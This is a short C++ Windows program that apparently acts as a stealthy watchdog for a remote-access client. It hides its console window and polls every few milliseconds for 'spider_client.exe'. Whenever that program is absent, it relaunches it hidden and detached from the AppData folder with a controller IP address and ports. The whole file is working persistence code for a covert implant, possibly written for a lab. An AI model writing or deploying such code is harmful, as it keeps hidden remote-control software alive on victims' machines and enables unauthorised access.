#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <cstring>
#include <chrono>
#include <thread>

static bool isProcessRunning(char const *processName)
{

  bool           exists = false;
  PROCESSENTRY32 entry{};
  entry.dwSize = sizeof(PROCESSENTRY32);

  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (Process32First(snapshot, &entry))
    {
      while (Process32Next(snapshot, &entry))
	{
	  if (!std::strcmp(entry.szExeFile, processName))
	    {
	      exists = true;
	      break;
	    }
	}
    }
  CloseHandle(snapshot);
  return exists;
}

static void runProcess()
{
  std::wstring const env(_wgetenv(L"AppData"));
  std::wstring const processPath =
      env + L"\\spider\\spider_client.exe 172.16.107.1 1337 1338";
  STARTUPINFOW        siStartupInfo;
  PROCESS_INFORMATION piProcessInfo;
  std::memset(&siStartupInfo, 0, sizeof(siStartupInfo));
  std::memset(&piProcessInfo, 0, sizeof(piProcessInfo));
  siStartupInfo.cb = sizeof(siStartupInfo);
  siStartupInfo.dwFlags = STARTF_USESHOWWINDOW;
  siStartupInfo.wShowWindow = SW_HIDE;

  if (CreateProcessW(
          nullptr, const_cast<LPWSTR>(processPath.c_str()), 0, 0, false,
          CREATE_DEFAULT_ERROR_MODE | CREATE_NO_WINDOW | DETACHED_PROCESS, 0,
          0, &siStartupInfo, &piProcessInfo) != false)
    {
      WaitForSingleObject(piProcessInfo.hProcess, (2 * 1000));
    }
}

int main()
{
  ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
  while (1)
    {
      using namespace std::chrono_literals;

      if (!isProcessRunning("spider_client.exe"))
	{
	  runProcess();
	}
      std::this_thread::sleep_for(5ms);
    };
  return EXIT_SUCCESS;
}